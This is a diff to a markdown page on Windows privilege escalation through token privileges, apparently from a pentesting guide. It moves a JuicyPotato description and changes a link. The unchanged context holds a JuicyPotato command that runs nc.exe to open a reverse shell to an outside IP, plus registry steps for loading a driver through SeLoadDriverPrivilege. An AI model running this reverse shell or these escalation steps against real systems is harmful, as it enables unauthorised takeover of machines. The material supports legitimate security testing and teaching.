@@ -44,11 +44,10 @@ Any process holding this privilege can **impersonate** (but not create) any **to
 
 {% tabs %}
 {% tab title="Juicy-Potato" %}
+[JuicyPotato](https://github.com/ohpe/juicy-potato), a sugared version of RottenPotatoNG. It leverages several COM servers identified by this [list of CLSID](http://ohpe.it/juicy-potato/CLSID/)
 {% hint style="danger" %}
 JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer),[RoguePotato](https://github.com/antonioCoco/RoguePotato), [SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato) can be used to leverage the same privileges and gain NT AUTHORITY\SYSTEM
 {% endhint %}
-[JuicyPotato](https://github.com/ohpe/juicy-potato), a sugared version of RottenPotatoNG. It leverages several COM servers identified by this [CLSID](http://ohpe.it/juicy-potato/CLSID/)
-
 ```bash
 #nc.exe reverse shell
 c:\Users\Public>JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *
@@ -99,10 +98,7 @@ You need to create an entry in the registry with values for ImagePath and Type.\
 As you don't have access to write to HKLM, you have to **use HKCU**. But HKCU doesn't mean anything for the kernel, the way to guide the kernel here and use the expected path for a driver config is to use the path: "\Registry\User\S-1-5-21-582075628-3447520101-2530640108-1003\System\CurrentControlSet\Services\DriverName" (the ID is the **RID** of the current user).\
 So, you have to **create all that path inside HKCU and set the ImagePath** (path to the binary that is going to be executed) **and Type** (SERVICE\_KERNEL\_DRIVER 0x00000001).\
 
-
-{% content-ref url="abuse-seloaddriverprivilege.md" %}
-[abuse-seloaddriverprivilege.md](abuse-seloaddriverprivilege.md)
-{% endcontent-ref %}
+{% embed url="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege" %}
 
 ### SeTakeOwnershipPrivilege
 
